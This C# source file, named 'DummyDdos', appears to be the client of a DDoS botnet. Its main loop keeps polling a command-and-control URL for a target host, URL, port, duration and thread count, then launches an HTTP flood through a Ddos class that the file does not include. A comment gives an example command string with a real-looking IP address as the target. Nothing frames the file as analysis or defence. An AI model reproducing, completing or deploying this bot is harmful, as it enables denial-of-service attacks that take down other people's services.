using System;
using System.Collections.Generic;
using System.IO;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Threading;

namespace DummyDdos
{
    class Program
    {
        private static string Url = ""; //Response: host;url;port;duration;threads Example: 54.207.60.36;http://54.207.60.36/index.php?mrmir=debik;80;10;1000
        static void Main(string[] args)
        {
            while (true)
            {
                String[] response = Get(Url).Split(';');
                try
                {
                    Ddos Task = new Ddos(response[0], response[1], Int32.Parse(response[2]));
                    Task.HttpFlood(Int32.Parse(response[3]), Int32.Parse(response[4]));
                }
                catch (Exception e)
                {
                    Thread.Sleep(3000);
                }
            }
        }

        private static String Get(string Link)
        {
            WebRequest request = WebRequest.Create(Link);
            request.Credentials = CredentialCache.DefaultCredentials;
            ((HttpWebRequest)request).UserAgent = "1M50RRY";
            WebResponse response = request.GetResponse();
            Stream dataStream = response.GetResponseStream();
            StreamReader reader = new StreamReader(dataStream);

            return reader.ReadToEnd();
        }
    }
}
